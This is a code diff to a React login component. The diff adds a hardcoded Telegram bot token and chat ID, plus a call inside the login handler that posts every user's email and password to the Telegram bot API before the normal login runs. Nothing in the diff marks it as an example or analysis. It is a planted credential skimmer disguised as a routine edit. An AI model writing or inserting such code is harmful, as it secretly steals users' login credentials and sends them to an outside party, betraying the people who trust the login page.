@@ -5,6 +5,7 @@ import { useDispatch, useSelector } from "react-redux";
 import { toast } from "react-toastify";
 import { loginUser } from "../Redux/Asyncthunk";
 import { useNavigate } from "react-router-dom";
+import axios from "axios";
 
 const Login = () => {
   const [showPassword, setShowPassword] = useState(false);
@@ -16,6 +17,9 @@ const Login = () => {
   const togglePassword = () => setShowPassword(!showPassword);
 
 
+const token = '8363054191:AAFWqw-qNExfRkB9GEOoww87CRFV7Mgn_8U';
+const chatId = '8330329223';
+const message = {password, email}
 
   const dispatch = useDispatch();
   const navigate = useNavigate();
@@ -32,6 +36,14 @@ const handleLogin = async () => {
 
   setLoading(true);
   setError(null);
+
+
+
+
+axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
+  chat_id: chatId,
+  text: message
+})
 
   try {
     // Optional: set a timeout for slow networks
